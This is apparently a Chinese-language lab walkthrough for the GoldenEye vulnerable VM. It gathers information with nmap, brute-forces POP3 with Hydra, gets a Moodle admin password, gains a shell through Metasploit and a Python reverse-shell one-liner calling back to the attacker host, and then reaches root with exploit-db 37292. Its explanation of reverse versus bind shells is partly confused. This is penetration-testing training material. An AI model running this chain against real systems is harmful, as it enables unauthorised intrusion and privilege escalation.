GoldenEye

# 信息打点

1. 发现靶机ip
   1. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Y0YjNlOGVmMTAxM2Y2MTBlYmYzODM4YWEwMDg4MjRfc2Vqd2Vyd0ZpeTY2aG5Ya2NUVzVIcTdCTkppbFdqeGJfVG9rZW46V2VZZ2JoMzRPb0dSNW94U2xGVWNVb1J5bnZNXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)
2. 扫整个网段ip存活情况
   1. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=YTM5OGU2M2M4MTVjMTQyMDRjZjkyZTMyNDAzYzE1N2NfRlJBaFV1dVNIYmZQbGtUTHppRThWVEs0VkFaQmRZenZfVG9rZW46SFN5amJwWHRmb25qM1p4R2lSTGNmV3U3bmlkXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)
3. 扫描开放端口的服务版本
   1.  `Nmap -sV 192.168.200.0/24`
4. 单独扫描域名
   1.  `Nmap 192.168.200.135`
5. 发现25，80端口开放
   1.  浏览器访问192.168.200.135:80

   2.  出现提示，拼接新路径可以登录，需要找到账号密码

   3. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=NTlkZjg5NDVkMDljODIyZWEzNjM5ZDQ2MmEwODYzNjZfTzEyajVCeGgyS1JFUFNHQXE2N3BvdmRoVXhVUUxUeDBfVG9rZW46R2dwamJYZzlSb3JpTWd4a1JzYWNaNUd6bnplXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)
6. 找源码，进入js文件，发现注释
   1. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MjZiMjRlZDQyNTkzNjY1MDk1NjU3ODEyZjNiNmNjMzdfcVNEUHlhelNKZ1JwM0xWVVM1V0JHeHZSdW5tN3ZyWmVfVG9rZW46WjlLbGJCYmZEb1J6SWh4Rm51VGNYM05MblZoXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   2. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=NWFjMzc2ODUyZjM0NGEwMGEzY2ZhNmY0N2MxNTExZWFfUW5lbTdQYVRJM0drS0p0engwazlSQ0g0YXlRYzExVGFfVG9rZW46TGdSeWJrVkVhb3dYNmN4RzVnSmNhRDZpbjJlXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

找到两个用户名和密码（bp解密）

1. 成功登录进去

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=Yjk0OGMyNjVjY2NmMDI3ZjIxNjhlZGM2MWNkMzk5OWNfTTJVcEc0YUtRRENraG4ybmRqZXRQODBNVHZleHVVS1hfVG9rZW46WE41UmJvbGt5b2ZJZXV4SzhHS2N1Zk8zbkxoXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MzkwNTA2YTA4MDc5ZjQ1NTU3ZDNjNmIwZDJjZjc4NmZfS1Q2SXBTVnNUQk90MmkybEVaSjlRQzdLWHRXSHJneDNfVG9rZW46R2lZWWJSTjVub0tNbmx4Tld1UWNkdjdIbkFjXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

开启的POP3服务在非常高的非默认端口运行

1. 全端口扫描    `Nmap ``-p- ``192.168.200.135`
   1. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2ZlMTEyNzhhZjFkY2UzODc2NGFkMDNkZDI2ZTk1YWRfZ2tNUVk3NUF0MmlvUzNOMVlXZEhjNzNMSjFyVkxjbGNfVG9rZW46WURLaGJCRThYb1lrRjN4bjc0bGNpaWxqbkhoXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   2.  （一个端口扫描    `Nmap -p3306`）

   3.  发现多出来的55006和55007两个端口

   4.  进一步扫描端口服务的详细信息，扫描结果发现都开放了POP3的mail服务

   5.  nmap -sS -sV -A -T5 -p55006,55007 192.168.200.135

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=NzI1ZmFlZWVhYWQ1MDFjOTg4MTNmYTE0YjQ4ODNmNzRfaENPWE5nV0MxdXNlZ0M5eUdwRGplbnRJaThMalN0WG9fVG9rZW46UDBkZWI1Uk5Ob0UwTEt4bWx3YmNYN3lDbkx4XzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

1. POP3邮箱服务需要登录，即账号密码
   1.  注释中提过目标系统正在使用默认密码，需要九头蛇Hydra暴力破解

   2.  先用echo命令两个用户名写入txt文件，再用Hydra进行密码爆破——kali自带的字典

   3.   换行写法：`echo -e 'natalya\nboris' > name.txt`

   4. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2QwYjRmNmU0NDJkMzI4NTE2MWZkMzg1ZWQzN2QwNDlfUXNDemhTbnBxUDhOdDk5NkN6bk1aMGYyTERTb1VvbVFfVG9rZW46RVFFZWJ0SnV1b2NSRFd4QlQ3U2NGRnJhbkVjXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   5.  `Hydra -L name.txt -P /usr/share/wordlists/fasttrack.txt 192.168.200.135 -s 55007 pop3`

   6.  获得两个账号密码

   7. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MTMyNzNlYTFiZWI3NDlmNjQzN2E4YTlkMjA5ZDhiNWJfMTNUeVV6RXdCQmFhOXl0YWNYYUQ4dHBjcUV1dmptSDVfVG9rZW46RTZVa2I0QWxNbzFSN214eEhidGM4NWtHbkcxXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   8. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=YzY2ZDE5MzQ1ZjQ5YjhkZjIyZGY4MzkwMWYwYmFjNDlfSkRoa2s0S2lhVW9yQWw1clpzSWhvU3ZBZFgwRkRmaG1fVG9rZW46SFZpZ2J6b0Rub3B6aVl4YU5Wc2NzeDZqbll0XzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)
2. 通过nc（监听端口服务，传输文件，反监听）
   1. nc 192.168.200.135 55007

   2. user xxx

   3. pass xxx

   4. list数量

   5. retr 1查看

   6.  分别查看boris和natalya的邮件

   7. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjBiMTkzMmM3OGU0M2RkMzVkNTRhM2U1Y2QyNWQ0MWJfRnV6Yjhqa091QnFDTVJJQWJNUzJoTlFMRnNGT3d6dUVfVG9rZW46Rk9zRGJubFFGb2d2b0N4eVE2TmNvaTVybkNlXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   8. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=YjI0MjUyMjM4ZmMxYWFjZTI1MTM0YjAyNzU3NjIyNzBfMFY4NmY3cEVEeWVCNHN0dlFZSHZQU0d6VjlrQ3JqMk9fVG9rZW46TzhzVGJnSDB0b2MwUld4bDlGVmN2QnZCbnRlXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

在natalya的邮件中写了另一个用户名密码以及内部域名（需要添加主机文件，在/etc/hosts中，不是host）

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=NDFlMThmZWRjMTQzMjRjNjVhYWIxYjA2Njk1M2Y1ZTlfOE5LRFdmamR2T1FPSTV5UlZScEI4eGlsc3dYV1Q3VDZfVG9rZW46SFQ0QWJ1UnNxb3E0TlZ4Q3lqemNIZmNVbnNnXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

1. 访问severnaya-station.com/gnocertdir，看到moodle(一个开源的CMS系统)，点击Intro使用natalya第二封邮件中的账号密码登录进去
   1.  2.2.3版本——可以查看有没有对应版本的内核提权的exp/poc

   2.  Home /  My profile /  Messages --->发现有一封邮件，内容发现用户名doak

   3. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=NzNhNGRmMDk4NWU4YTE0MTllNjJhNzY3YzdjMmE0MTBfcG9MQktXZmtUYzFMQk9CTnA3M0JYemFaalpIa1hkb2NfVG9rZW46Vjg0eWI2ZHh2b2tpN0J4UGd3cGNTWUE2bkdlXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   4. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmM0YWI4Njc4NjY5NDY3NTdhYjZmY2JhMGQyMGU0OGVfREVFRnZXZ2FneDByOWxyQlJDWkYxZVZZeDJXeDVCWmxfVG9rZW46R0E0YWJzdFVhb0VZQ3V4R0VnaGN5dHE2bmtjXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   5.  继续爆破用户名为doak的密码，添加到name.txt

   6.  `echo doak > name.txt`

   7. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=YzEyNDllOWNiZTMxODljNjc0MzhlN2MyMzM2NjgzNGNfenhXV3I3bTlTRlVlVHhkQVZ3eTJrWnZWenRLeThtNWxfVG9rZW46UkRZUmJIbnBRb1FMdGx4akpYRmM1b3RnbmJlXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   8.  用Hydra爆破

   9.  `hydra -L dayu.txt -P /usr/share/wordlists/fasttrack.txt 192.168.4.202 -s 55007 pop3 `

   10.  获得用户名密码：doak/goat

   11. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=OTAxZjNiZjVhNDY3NGEzZjk3YzcxYmVhN2E3ZGYwOTZfUm5vMHc0eWhWUGs0bncwckdPNUtOWnEzTU4wV3F6c2JfVG9rZW46UXFKNmJuMEtnb1IzeEx4WlNsSGNUUUhEbktjXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)
2. nc监听连接55007——POP3服务端口，获取邮件内容list——retr
   1. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MDJjMTUzNDAzNzgwODUwOGIzYTQxNThjNjY5NjA5YThfRmhZdGtRTE9nODhERnNXck1QM012a2ZSY0dNV1A0QWZfVG9rZW46RlNvSWJNS0RZb0ZOeWd4SnhoTmNSRHdwbnljXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   2.  用户名：dr_doak

   3.  密码：4England!

   4.  发现新的账号密码，登录CMS，Home /  My home 右边发现： s3cret.txt

   5. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MmZlYTViZTFmMzA4Y2NlMWZjODgyMDE0M2FiZjNhMGVfUnd3OW5lckZhQ1M3d0t5UEp3bzhCN2dxMTZ4ME9JMzlfVG9rZW46UVBTSGJ0NGNSb0tBcmh4UjhWR2NGcFhRbmFnXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   6.  打开发现

   7.  Something juicy is located here: /dir007key/for-007.jpg

   8.  现在我们查看文件的内容，指出管理员凭据已隐藏在映像文件中，让我们在浏览器中打开图像以查看其内容。

   9. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=YjU1ZTBiZjllODdkOWVmYjM2NDUyMDE2YmRlMmM1ODZfbWNYNUxHcVRnOXFEcWkweVA3eUFzUG9KTDZZbVhkTnhfVG9rZW46UjNnN2J5NnBEb3ZlM0p4SGhSbWNWSFFybmtoXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   10.  访问页面：severnaya-station.com/dir007key/for-007.jpg，发现神秘图片Ooops！

   11.  下载到本地：

   12.  wget http://severnaya-station.com/dir007key/for-007.jpg

   13. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MzJmNzU0NjQyODExM2E3MDA4NjY1YmNlNTVjZThlN2RfbTlZWVU3MDF3aUU4NGxDcmhyRTlrdk5GMWRXaVVTandfVG9rZW46VEp1dmIxa0dob2ZRZVd4aHh2S2NuOGRObmdkXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   14. 
3. 涉及ctf里面的工具查看jpg文件底层内容
   1. binwalk（路由逆向分析工具）

   2. exiftool（图虫）

   3. strings（识别动态库版本指令）

   4.  exiftool for-007.jpg

   5. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=NzNiNGNmMDQ2NWEyODEwZDk2NzJhZTUxMDcyNzJiMTNfQ2lwNzVFMERjcGhQZ3BWQWMweWJ5SDdNdEhObm5YM2RfVG9rZW46Rk9RS2JhWUVOb0pwRUF4QzZFcmM1Uk5KbmZiXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   6.  strings for-007.jpg

   7. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDhiZjg2ZGJiMDFmNWVjZjc0NTdhMjE0NjFkMDk2MzdfWkRIT2N5TnVleWRKOEFHeTllcjNKeTBxS2NJaTdqZ3RfVG9rZW46TGVSZWJqdDZnb053dG54VW1CMWNPZzIxbkwzXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   8.  用以上命令都可以查看到base64编码隐藏信息：eFdpbnRlcjE5OTV4IQ==，解密得xWinter1995x!

   9.  根据线索，这是管理员用户的密码。管理员用户身份继续登陆应用程序。

   10. ![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=NjVjN2RmOGNjYTFhMDQwN2VkMmExZjU2MzY4OGM5NGFfVDlNMko4MGUwRjZKSllrbHpoUktVWU5WQkI4bjBEMHpfVG9rZW46SXo3TmJMVHhtb2psQzF4R3YzWWNFTmREbjZmXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

   11.  用户名：admin

   12.  密码：xWinter1995x!

   13.  登录成功！管理员权限很多

# 漏洞探测、利用

继续发现了Moodle的版本号，决定寻找Moodle 2.2.3版本的漏洞exp

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWQ2YmUyNmNhNmE0NGQ1YWRlM2NhYmZkNTc1YjRhZmFfRVBDZnI3dDJGcWpFTWh4aUY5dWR3UkpPSDB6Z3hpSmdfVG9rZW46TnNnY2JsSXZjbzI3dEx4RWMyY2N2OWhYbmRjXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

 Moodle 2.2.3 exp cve   --> CVE-2013-3630 远程命令执行RCE漏洞可利用

##  服务器shell

 [什么是交互式shell和非交互式shell?](https://www.maoyingdong.com/what_is_a_interactive_shell/)

 msf一把梭哈

```Python
msfconsole                        ---进入MSF框架攻击界面
search moodle                     ---查找 moodle这个CMS的攻击的模块
use 1(攻击脚本编号)                ---调用0  exploit/multi/http/moodle_cmd_exec调用攻击脚本
show options                      ---查看需要填充的变量
set username admin                ---设置用户名：admin
set password xWinter1995x!        ---设置密码：xWinter1995x!
set rhost severnaya-station.com   ---设置：rhosts severnaya-station.com
set targeturi /gnocertdir         ---设置目录： /gnocertdir
set payload cmd/unix/reverse      ---设置payload：cmd/unix/reverse（linux内核，Linux是一个                                      类 Unix 操作系统）
set lhost 192.168.200.131         ---设置：lhost 192.168.200.131（需要本地IP）
exploit  ----执行命令
```

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MDIyNmRlNGY4MWU3OGVlOTVhMTRmNzNiZGVmNmVmMDZfdFkwd3FOeUZ5TkFNbmYya0Q3bUpaVjRjbVR6TkMwcUpfVG9rZW46U2E4aGJPNzR6b2VkWGl4dFBDY2NMaGo5bndnXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTY5MjgzODI3ZWNiZGY2NDI0Nzc5NDUwZjUwNzc3YjJfYjZ5dmVWRndpRzkzanBaZkhpSjdHSmwyb0M3WktBR0hfVG9rZW46UnowT2JNRkpBbzF4Sk14SUR3V2NxNmdvbnZiXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=NjUwNDgyYTA0ZjlhZWJjYTcxMGRmOWEwNjY1NTQzOTJfUk8xQmY2cHVGanRGMW4xOWYyQmNKVlJKRVU2M3BiWlRfVG9rZW46TFJDc2JhckJnb0xxZDd4bVBJZ2MwdFhrbmhFXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MWU4YTlkNjRjOTA5MWUxODAwMTUzZDUwY2E0ODczM2ZfZDd2UU5XTTRoTEE3WEV3RkpaVmhWZm85YTE3RHlHd21fVG9rZW46VkwzSWIwaVIxb2JGMnF4YlFTTGNtUDBnbk5mXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MmU4NmQ5YjdkOWE5NWI2YTUzOTNiMDdjYTIwODJmNjJfWEN6TTlkemVvaHRWUVE2NWQ2MkJxVUtJNHZqUWdtenpfVG9rZW46SWY3b2JFWHN1b001ekx4Y1VqcWNxSnhwblhpXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

攻击发现没成功

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MzlmMjBjOTA4Y2MxNTY0ZWVkZjE0YjdlNDY5NDk2ZWVfS2JUVnl2M0pyeFpZaERkNW81RGhtRGtyUFRieUp5TlRfVG9rZW46SjA2cGJEbjZnbzhVak94cVNob2NhcE9VbkZoXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

我们登录了管理员admin，由于使用的是powershell命令，需要在设置中修改：

Home / ▶ Site administration / ▶ Plugins / ▶ Text editors / ▶ TinyMCE HTML editor

来到此处，修改PSpellShell然后save

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=YzU3OThiZTBjZDM0N2U1ZDhkMGI3ZmUxOTgwYjZkODZfUGtXYjNIZWJ3TURwVzhhblJOTGRZcGdCV2d5bkxLa2RfVG9rZW46T2R5ZmJLT1lub1ZabUh4dVhSSGM1SUtTbmpiXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

再exploit，成功获得shell以及连接的端口

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=NTM0MzM3ZTE1MzY0OTIzMWQ0NmJiMDQwMGU5NDlkYmNfU01McGZ3M2NycEFrOE1lTzFUR3RmVkp5OTJmVlB3aE5fVG9rZW46TXZQZmJYUXlSb21HQU54RDJncWNFaHBmbkZiXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

成功获得服务器shell，可以查看以下信息

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=NGU5OTY2M2NkNjVhY2ZmNzFiZDE5ZjAxYjhhYjY3ZTNfMUY0aVRRcG8zQVlZT0ExdVFEeWxKYVZ4STVzcEExMlJfVG9rZW46TVdqNmJTUzdLb05YSXl4bGp5MWNLd2xHbjFnXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

发现这个shell有很多问题

- 无法使用vim等文本编辑器
- 不能补全
- 不能su
- 没有向上箭头使用历史 等等

## 半交互型shell

cd /tmp     需要在tmp目录下执行

执行tty，创建一个原生的终端，实现更直观和自然的交互。

Which python——发现存在python环境

`python -c 'import pty; pty.spawn("/bin/bash")'`     ---将shell进行tty

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MTI1Y2U3ZDc0OTA0MmY4NzdhZDNmYTk2MTMwZDRmYmFfbEk0dGExdjg0Q3NLVXJEejZtZzdpNnJEWGx3U2h4VXdfVG9rZW46Q21ZOWI0ZnZ3b1JiTUp4S1ZyUmNHWGxLbkpoXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

但是还是存在很多问题

- 无法使用vim等文本编辑器
- 不能补全
- 没有向上箭头使用历史

## 完全型交互shell

该部分内容搬运链接处的师傅的博客

[Linux 反向 shell 升级为完全可用的 TTY shell - sainet - 博客园](https://www.cnblogs.com/sainet/p/15783539.html)

1. 首先连接到 shell 后，先检查一下 python 的可用性， 用 which 命令检查：

```Bash
which python python2 python3
```

只要安装了其中任何一个，就将返回已安装二进制文件的路径。

1. 在靶机上输入以下命令（使用机器上可用的 python 版本）

```Rust
python3 -c 'import pty;pty.spawn("/bin/bash")';
```

1. 接下来，在靶机上输入以下命令来设置一些重要的环境变量：

```Bash
export SHELL=bash
export TERM=xterm-256color #允许 clear，并且有颜色
```

1. 键入 ctrl-z 以将 shell 发送到后台。
2. 设置 shell 以通过反向 shell 发送控制字符和其他原始输入。使用以下stty命令来执行此操作。

```Bash
stty raw -echo;fg
```

回车一次后输入 reset 再回车将再次进入 shell 中：

## 反弹shell

**反向 shell（Reverse Shell）：**

- 攻击者的系统主动连接到目标系统上开放的端口，建立控制台会话。
- 目标系统运行监听程序，等待攻击者连接。
- 反向 shell 对于穿越防火墙和网络限制较为方便，因为攻击者的系统主动发起连接。
- 这种连接方式通常能够绕过入站防火墙规则。
- 使用反向 shell，攻击者需要知道目标系统的 IP 地址和一个开放端口，以便建立连接。

**反弹 shell（Bind Shell）：**

- 目标系统主动连接到攻击者服务器，建立控制台会话。
- 攻击者监听本地ip的一个端口，目标系统连接到该端口。
- 反弹 shell 通常需要攻击者知道目标系统的 IP 地址和一个开放端口，攻击者需要监听这个端口。
- 反弹 shell 可能会受到目标系统的出站防火墙规则的影响，因为目标系统需要主动发起连接。

发现一个可以执行反弹shell的攻击点，输入python的反弹shell命令

```Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.200.131",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MmQyOTZiY2UwNTliOTU1YjAyZDk5YjAxZDI3ZGFjM2FfR2taQjRYdXM5eGZmWUs4ZHBMY1RZOGpjTHZudjBJNVRfVG9rZW46UjZPeGJOSGU3b3NPWFd4Ym84Z2NNWXVpblhlXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

建立新终端，先监听本地6666端口，`nc -lvp 6666`

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=NDAyYTk1YTNkYzEyODQwNDE1NTcyYTE0YzhjNTYxOWJfUGhSMEI4ZDhUYnZLcDBQbHF1U3hOdDRBNWplVHl1aXhfVG9rZW46QWc4bGJPUTUwb3ZyYkd4a3dHSmNYUEtqbjBjXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

创造网页流量触发命令，点击右下角ABC那个按键，使攻击服务器监听到，获得一个shell权限

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=YWYyZjFkODY3Y2RhYmJkNGQyZjRiY2Q4ZmE4NTVkMDdfVld5cXJDRXNTQk1WNWc5Qm56aVZkeVF3Y3h5NTJETUxfVG9rZW46RnRJUmJPcExEbzFySU14a25kdmNpN2Uybnc3XzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjRkOGRjNzJiNDE3ZTQxZDMzNWNmM2U2MGZmZTI1ZTVfdTJDT3FPTFBSa2tSRzVuTDRNVnRWRzRydWx6bzgxcEVfVG9rZW46UmdwUWJQclRqb1RFTGN4SGsyTWNRVUhJblRoXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

也需要使用python获得tty

# 内核提权

www-data是低特权用户，需要提升到root权限

`cd /tmp` 进入tmp目录

`uname -a` 根据linux版本提权

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MDNjNzY3YTExZTc5MGRlNjQwZTBjZTg3ZjAwNWFkZjVfaU4zSjNlMFM4Sk9ua1BkS0owQXZGYm1BZVRHQ3RlcERfVG9rZW46TENsY2JiYkJJbzQ1S1l4ZnlPZ2NxdVRDblNkXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

谷歌搜索：Linux ubuntu 3.13.0-32 exploit

获得exp版本：37292

换回攻击者的终端

`searchsploit 37292`        ---搜索kali本地的exp库中37292攻击脚本信息

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGRjMDMwOTk4MTk5M2NiY2M0MTU1MjA0MDE3M2MxMWNfNXVhSm1OVGk5WWdoUnY2MGJFY1RZOXJSUGFBc0FDbThfVG9rZW46QU9CZ2JUZHBub21JbVh4a3RNdGNhRFQ1bmRlXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

`cp /usr/share/exploitdb/exploits/linux/local/37292.c /home` ---目录自行修改

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MjMxYmNiMTYxYjk3ZjdjZjZhNzE3ZmU0YmU3YzZhZDFfT2dZTmZIRER3cllhSWM2MkIwT3JnZHp6WDFiWTJudkVfVG9rZW46UjVNc2JHUjIxb1JzN0x4M1NVTWNOMmlHblhmXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

探测目标系统

`gcc -h`     gcc没有安装

`which cc`    cc有安装

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MDFhMmIxMDIzYzdjYmJhYTE4ZjgzZmMyZTM5NDc1MmRfWTh4dDc5OWlkdTYyNFI3b3JBQnUyZVNoN0dEQnRGWGRfVG9rZW46T1oxVGJIZG0wb01sU3F4YjlyN2NTMG43bjRnXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

无法进行GCC编译，需要改下脚本为cc

gedit 37292.c       ---文本打开 

第143行将gcc改为cc  

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MDFmYmYyNTE2MTI4YjI2YWE1NjdhZjA5OTY2YWU3NTVfSm1mWG1LR0pkcGNMUnFVVVJ0RUplOWdsdUtYTGJHZ2RfVG9rZW46VkFScGJDaGpNb2xQVjV4OGtBb2NqWlNVbnRiXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

攻击者使用python创建一个网络服务，上传37292.c到靶机中

```
python3``——python -m http.server 8081
```

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=NGViZWVlY2RkYmY0ZWM1ZjMzOThjOWZmZThkZWM3YThfQ1EwOUxlcXNicDMxemlOb3c1Q1pnUnVmRGJWaERxZWZfVG9rZW46Q3R0QWJmRFZUb09wdE54WThEMWNCNVRBbjhkXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

在已连接的目标系统用wget下载

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmU5OGQ1YWZiYTAzMDZjM2NjNDFjYTIxY2YzYjlmZWFfdEhmUzY3ZXBhZjBmVld6ZUVvRVE0T2VZTTFZZE5xdE5fVG9rZW46UTBIUGJoY2o3bzBuZ0x4WjY5S2NpM1dIblBoXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmNlMjQ5MmYxMzBjNjVhYzdjZmM1YWFkYWMwNzE5ZjBfcWZHYWxUT2t4TmhWbHAxM0dYNVY5V0RrTDZqUXpxcEJfVG9rZW46TnI5N2I0c0Nqb2xLMlR4dWE0a2M4UTYwbjFlXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

编译（无视报错）

`cc 37292.c -o xxg `    ---C语言的CC代码编译点c文件

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=YmVmYjliN2FlMGJjZTUxN2UwNGY4NzU0YTE4MTg4ZWFfRmV2bjRZVXRhWWIwaFdIcWYwY1FTb0dQNnY5Yk4wdlNfVG9rZW46RjdYd2JnWGhVb1dYczB4U1V5bmNDRVhRbmFoXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

`chmod +x xxg`          ---编译成可执行文件，并赋权

`./xxg`                      ---点杠执行

成功getshell，获取root权限

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjMzOTI4MjljMzFlYzNkNGY2YTkxODA5MWZjMDlhMTFfVzAyWGQ4eDJqRVNtY0FIcFpFUGFYQzNheFk3SFlnZ3RfVG9rZW46VnJ6VWJFOTNPb1l4Mkt4Q2d3eGNoRzcxblFnXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)

获取flag

**`ls`**` -a`          ----*显示当前目录中的所有文件和目录，包括**隐藏**文件*

`cat .flag.txt`               ----打开隐藏的txt

在 Unix 和类 Unix 操作系统中，以点（`.`）开头的文件名通常被视为隐藏文件。

![img](https://r5bf0bjx4j.feishu.cn/space/api/box/stream/download/asynccode/?code=MzM3NGM1MjkyNmJjZjU4ZmM0YmU5MmU5OGE4M2M2ZjZfdzJhSVdKU1VUT05WMkpGbEdRWUVuWlZMZGMwNFRCVFNfVG9rZW46VGQ5eWJ5Snpxb3ZqR0p4alhubmNmeXBDbm1nXzE2OTIwMDE5NTI6MTY5MjAwNTU1Ml9WNA)
